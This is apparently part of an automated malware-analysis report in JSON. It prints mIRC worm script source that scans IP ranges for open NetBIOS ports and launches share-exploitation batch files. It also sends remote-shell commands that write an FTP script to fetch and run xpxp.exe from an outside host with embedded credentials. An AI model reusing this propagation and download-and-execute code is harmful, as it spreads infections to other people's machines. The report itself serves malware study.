            "  if %totalscaning == %total opensocks 33",
            "  set %ip34 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 34",
            "  set %ip35 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  opensocks",
            "alias opensocks {",
            "  sockopen ip1 %ip1 %nb.port",
            "  if $1 == 1 finished",
            "  sockopen ip2 %ip2 %nb.port",
            "  if $1 == 2 finished",
            "  sockopen ip3 %ip3 %nb.port",
            "  if $1 == 3 finished",
            "  sockopen ip4 %ip4 %nb.port",
            "  if $1 == 4 finished",
            "  sockopen ip5 %ip5 %nb.port",
            "  if $1 == 5 finished",
            "  sockopen ip6 %ip6 %nb.port",
            "  if $1 == 6 finished",
            "  sockopen ip7 %ip7 %nb.port",
            "  if $1 == 7 finished",
            "  sockopen ip8 %ip8 %nb.port",
            "  if $1 == 8 finished",
            "  sockopen ip9 %ip9 %nb.port",
            "  if $1 == 9 finished",
            "  sockopen ip10 %ip10 %nb.port",
            "  if $1 == 10 finished",
            "  sockopen ip11 %ip11 %nb.port",
            "  if $1 == 11 finished",
            "  sockopen ip12 %ip12 %nb.port",
            "  if $1 == 12 finished",
            "  sockopen ip13 %ip13 %nb.port",
            "  if $1 == 13 finished",
            "  sockopen ip14 %ip14 %nb.port",
            "  if $1 == 14 finished",
            "  sockopen ip15 %ip15 %nb.port",
            "  if $1 == 15 finished",
            "  sockopen ip16 %ip16 %nb.port",
            "  if $1 == 16 finished",
            "  sockopen ip17 %ip17 %nb.port",
            "  if $1 == 17 finished",
            "  sockopen ip18 %ip18 %nb.port",
            "  if $1 == 18 finished",
            "  sockopen ip19 %ip19 %nb.port",
            "  if $1 == 19 finished",
            "  sockopen ip20 %ip20 %nb.port",
            "  if $1 == 20 finished",
            "  sockopen ip21 %ip21 %nb.port",
            "  if $1 == 21 finished",
            "  sockopen ip22 %ip22 %nb.port",
            "  if $1 == 22 finished",
            "  sockopen ip23 %ip23 %nb.port",
            "  if $1 == 23 finished",
            "  sockopen ip24 %ip24 %nb.port",
            "  if $1 == 24 finished",
            "  sockopen ip25 %ip25 %nb.port",
            "  if $1 == 25 finished",
            "  sockopen ip26 %ip26 %nb.port",
            "  if $1 == 26 finished",
            "  sockopen ip27 %ip27 %nb.port",
            "  if $1 == 27 finished",
            "  sockopen ip28 %ip28 %nb.port",
            "  if $1 == 28 finished",
            "  sockopen ip29 %ip29 %nb.port",
            "  if $1 == 29 finished",
            "  sockopen ip30 %ip30 %nb.port",
            "  if $1 == 30 finished",
            "  sockopen ip31 %ip31 %nb.port",
            "  if $1 == 31 finished",
            "  sockopen ip32 %ip32 %nb.port",
            "  if $1 == 32 finished",
            "  sockopen ip33 %ip33 %nb.port",
            "  if $1 == 33 finished",
            "  sockopen ip34 %ip34 %nb.port",
            "  if $1 == 34 finished",
            "  sockopen ip35 %ip35 %nb.port",
            "  .timerscanner1 1 3 /sockclose ip*",
            "  .timerscanner2 1 4 /st4rtsc4n",
            "alias randscan {",
            "  unset %1p1 %1p2",
            "  set %1p1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)",
            "  :set2",
            "  set %1p2 $gettok($ip,1-2,46) $+ .255.255",
            "  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }",
            "alias stopscan { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | unset %beg* | unset %end* }",
            "alias finished {",
            "  if (%auto != on) { notice %o1 Scanning from %begshortip to %endshortip is finished! | stopscan }",
            "  if (%auto == on) { notice %o1 Scanning from %begshortip to %endshortip is finished, now starting up new range! | stopscan | randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | st4rtsc4n | notice %o1 [NetBios Scanner] starting scan from: %begshortip to %endshortip using %scan.bat sharing thru port %nb.port }",
            "on 1:sockopen:ip*:{",
            "  if (%scan.bat = admin) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"4dm1n.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [Admin Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }",
            "  if (%scan.bat = ipc) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe run /n /fh /r \"1pc.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [Ipc Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }",
            "  if (%scan.bat = c) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"c.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [C Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }",
            "  if (%scan.bat = ipc.admin.c) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"m2.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [Admin/Ipc/C Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }",
            "  if (%scan.bat = b) { if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | talk port open ip: %ant1 }",
            "  if (%scan.bat = a) { if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"spread.bat   %ant1 %sf $+ \" | notice %o1 op: %ant1 | sockclose $sockname | unset %ant1 | halt }",
            "  if (%scan.bat = f) { if ($sockerr != 0) { .sockclose $sockname | halt } | run van32.exe dl.exe -t $sock($sockname).ip 6175 | run van32.exe dl.exe 0 $sock($sockname).ip 6175 | run van32.exe dl.exe 1 $sock($sockname).ip 6175 | run van32.exe dl.exe 2 $sock($sockname).ip 6175 | timerBind $+ $sockname 1 7 sockopen bind445 $+ $ticks $sock($sockname).ip 6175 | sockclose $sockname }",
            "on 1:sockopen:bind445*: { ",
            "  if ($sockerr != 0) { .sockclose $sockname | halt } ",
            "  sockmark $sockname",
            "  timer $+ $sockname 1 10  sockwrite -nt $sockname dd",
            "  timer $+ $sockname $+ 1 1 10  sockwrite -nt $sockname dd",
            "  sockwrite -nt $sockname echo open ftp.freewebtown.com 21>>x.txt",
            "  sockwrite -nt $sockname echo asssa>>x.txt",
            "  sockwrite -nt $sockname echo cy1D.5gq>>x.txt",
            "  sockwrite -nt $sockname echo binary>>x.txt",
            "  sockwrite -nt $sockname echo hash>>x.txt",
            "  sockwrite -nt $sockname echo get xpxp.exe>>x.txt",
            "  sockwrite -nt $sockname echo quit>>x.txt",
            "  sockwrite -nt $sockname ftp -s:x.txt",
            "  sockwrite -nt $sockname del x.txt",
            "  sockwrite -nt $sockname xpxp.exe",
            "  timerUpIt $+ $sockname 0 8 /sockwrite -nt $sockname dd",
            "  timerclose $+ $sockname 1 700 /sockclose $sockname",
            "on *:sockread:bind445*:{ ",
            "  sockread %readroot ",
            "  if (system32> $+ %sf isin %readroot) { ",
            "    talk lsass : $sock($sockname).ip is Now completed using port: %nb.port .. ",
            "    timerUpIt $+ $sockname off ",
            "    sockclose $sockname ",
            "  } "
        ],
        "file": {
            "  %sf = xpxp.exe": "Executable",
            "  sockwrite -nt $sockname del x.txt": "Text",
            "  sockwrite -nt $sockname echo asssa>>x.txt": "Text",
            "  sockwrite -nt $sockname echo binary>>x.txt": "Text",
            "  sockwrite -nt $sockname echo cy1D.5gq>>x.txt": "Text",
            "  sockwrite -nt $sockname echo get xpxp.exe>>x.txt": "Text",
            "  sockwrite -nt $sockname echo hash>>x.txt": "Text",
            "  sockwrite -nt $sockname echo open ftp.freewebtown.com 21>>x.txt": "Text",
            "  sockwrite -nt $sockname echo quit>>x.txt": "Text",
            "  sockwrite -nt $sockname ftp -s:x.txt": "Text",
            "  sockwrite -nt $sockname xpxp.exe": "Executable"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://",
            "ftp://%ftp.user:%ftp.pass@ip:%ftp.port/"
        ]
    },
    "time": "0:00:00.672959",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
